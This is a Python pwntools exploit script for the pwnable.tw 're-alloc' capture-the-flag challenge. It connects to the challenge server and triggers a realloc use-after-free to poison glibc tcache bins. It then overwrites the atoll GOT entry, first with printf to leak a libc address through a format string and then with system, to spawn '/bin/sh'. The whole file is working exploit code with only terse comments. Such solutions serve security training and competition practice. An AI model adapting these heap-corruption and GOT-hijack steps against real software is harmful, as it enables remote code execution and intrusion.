#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./re-alloc_patched')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.29.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10106)

def alloc(idx, sz, data):
    sla('Your choice: ', '1')
    sa('Index:', str(idx))
    sa('Size:', str(sz))
    sa('Data:', data)

def realloc(idx, sz, data=None):
    sla('Your choice: ', '2')
    sa('Index:', str(idx))
    sa('Size:', str(sz))
    if data:
        sa('Data:', data)

def free(idx):
    sla('Your choice: ', '3')
    sa('Index:', idx)

atoll_got = elf.got['atoll']
printf_plt = elf.plt['printf']

# put got into 2 tcache bins
alloc(1, 0x18, 'A' * 8)
realloc(1, 0x0) # create uaf
realloc(1, 0x18, up64(atoll_got)) # forge tache fd pointer & extend chunk size
alloc(0, 0x18, 'A' * 8)
realloc(1, 0x38, 'A' * 8)
free('1')
realloc(0, 0x48, 'A' * 8)
free('0')
# do it again
alloc(1, 0x28, 'B' * 8)
realloc(1, 0x0) # create uaf
realloc(1, 0x28, up64(atoll_got)) # forge tache fd pointer & extend chunk size
alloc(0, 0x28, 'B' * 8)
realloc(1, 0x58, 'B' * 8)
free('1')
realloc(0, 0x68, 'B' * 8)
free('0')

# get first got to leak libc
alloc(0, 0x28, up64(printf_plt)) # alloc the got chunk
free('%3$p\n') # fmtstr
ru('0x')
libc_base = int(ru('\n')[:-1], 16) - 0x12e009
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))

def new_alloc(idx, sz, data):
    sla('Your choice: ', '1')
    sa('Index:', idx * 'A')
    ru(idx * 'A')
    sa('Size:', sz * 'A')
    ru(sz * 'A')
    sa('Data:', data)

# get second got to get shell
new_alloc(1, 0x10, up64(system))
#gdb.attach(p)
free('/bin/sh\x00')

p.interactive()

